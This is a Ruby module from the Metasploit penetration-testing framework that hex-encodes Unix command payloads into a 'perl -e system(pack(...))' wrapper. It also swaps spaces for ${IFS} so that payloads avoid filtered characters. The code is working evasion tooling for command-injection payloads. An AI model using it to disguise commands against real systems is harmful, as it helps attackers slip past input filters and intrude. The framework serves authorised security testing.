##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'


class Metasploit3 < Msf::Encoder

  Rank = GoodRanking

  def initialize
    super(
      'Name'             => 'Perl Command Encoder',
      'Description'      => %q{
        This encoder uses perl to avoid commonly restricted characters.
      },
      'Author'           => 'hdm',
      'Arch'             => ARCH_CMD,
      'Platform'         => 'unix',
      'EncoderType'      => Msf::Encoder::Type::CmdUnixPerl)
  end


  #
  # Encodes the payload
  #
  def encode_block(state, buf)

    # Skip encoding for empty badchars
    if state.badchars.length == 0
      return buf
    end

    if state.badchars.include?("-")
      raise RuntimeError
    else
      buf = encode_block_perl(state,buf)
    end

    return buf
  end

  #
  # Uses the perl command to hex encode the command string
  #
  def encode_block_perl(state, buf)

    hex = buf.unpack("H*")
    cmd = 'perl -e '
    qot = ',-:.=+!@#$%^&'

    # Find a quoting character to use
    state.badchars.unpack('C*') { |c| qot.delete(c.chr) }

    # Throw an error if we ran out of quotes
    raise RuntimeError if qot.length == 0

    sep = qot[0].chr

    # Convert spaces to IFS...
    if state.badchars.include?(" ")
      cmd.gsub!(/\s/, '${IFS}')
    end

    # Can we use single quotes to enclose the command string?
    if state.badchars.include?("'")

      if state.badchars.match(/\(|\)/)

        # No paranthesis...
        raise RuntimeError
      end

      cmd << "system\\(pack\\(qq#{sep}H\\*#{sep},qq#{sep}#{hex}#{sep}\\)\\)"

    else
      if state.badchars.match(/\(|\)/)
        if state.badchars.include?(" ")
          # No spaces allowed, no paranthesis, give up...
          raise RuntimeError
        end

        cmd << "'system pack qq#{sep}H*#{sep},qq#{sep}#{hex}#{sep}'"
      else
        cmd << "'system(pack(qq#{sep}H*#{sep},qq#{sep}#{hex}#{sep}))'"
      end
    end

    return cmd
  end

end
